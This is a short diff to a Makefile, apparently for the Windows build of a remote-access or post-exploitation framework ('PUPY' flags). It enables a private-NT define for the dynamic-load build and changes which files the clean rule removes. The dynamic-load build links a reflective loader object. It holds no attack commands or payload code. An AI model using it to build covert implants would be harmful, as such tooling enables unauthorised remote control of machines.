@@ -84,8 +84,8 @@ APP_OBJS := \
 
 
 ifneq ($(FEATURE_DYNLOAD),)
-#CFLAGS += /D_PUPY_DYNLOAD /D_PUPY_PRIVATE_NT
-CFLAGS += /D_PUPY_DYNLOAD
+CFLAGS += /D_PUPY_DYNLOAD /D_PUPY_PRIVATE_NT
+#CFLAGS += /D_PUPY_DYNLOAD
 SHARED_OBJS += ReflectiveLoader.obj
 LIBPYTHON_LIBS := $(PYTHONPATH)\\libs\\python$(PYMAJ)$(PYMIN).lib advapi32.lib
 LIBPYTHON_INC := /I$(PYTHONPATH)\\include
@@ -249,10 +249,10 @@ clean:
 		$(PUPY_PYD_C) \
 		$(APP_OBJS) \
 		$(PUPY_PYD) \
-		$(TARGETS) \
 		*.exp \
 		*.lib \
 		*.map \
+		*.obj \
 		$(TEMPLATE_OUTPUT_PATH)/*.lib \
 		$(TEMPLATE_OUTPUT_PATH)/*.exp \
 		$(TEMPLATE_OUTPUT_PATH)/*.map
